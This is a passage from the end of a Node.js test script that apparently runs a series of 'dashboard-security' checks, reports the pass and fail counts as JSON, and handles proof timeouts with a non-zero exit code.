  await proveNeverResolvingCdpCleanup();
  await proveDebuggerTargetRetry();
  proveTimeoutExitSurface();
  await actualServerHeaderProof();
  await browserProof(html);
  const failed = checks.filter((receipt) => !receipt.passed);
  console.log(JSON.stringify({ proof: "dashboard-security", checks: checks.length, passed: checks.length - failed.length, failed: failed.map((receipt) => receipt.name) }));
  if (failed.length) process.exitCode = 1;
}

if (process.argv[1] && path.resolve(process.argv[1]) === scriptPath) main().catch((error) => {
  if (error instanceof ProofTimeoutError) {
    const stageDetail = error.message.split(":")[2];
    console.error(JSON.stringify({
      proof: "dashboard-security",
      error: "proof_timeout",
      stage: error.stage,
      ...(stageDetail ? { detail: stageDetail } : {}),
      ...(error.elapsedMs !== undefined ? { elapsedMs: error.elapsedMs } : {}),
    }));
  } else {
    console.error(error instanceof Error ? error.stack : String(error));
  }
  process.exitCode = 1;
});
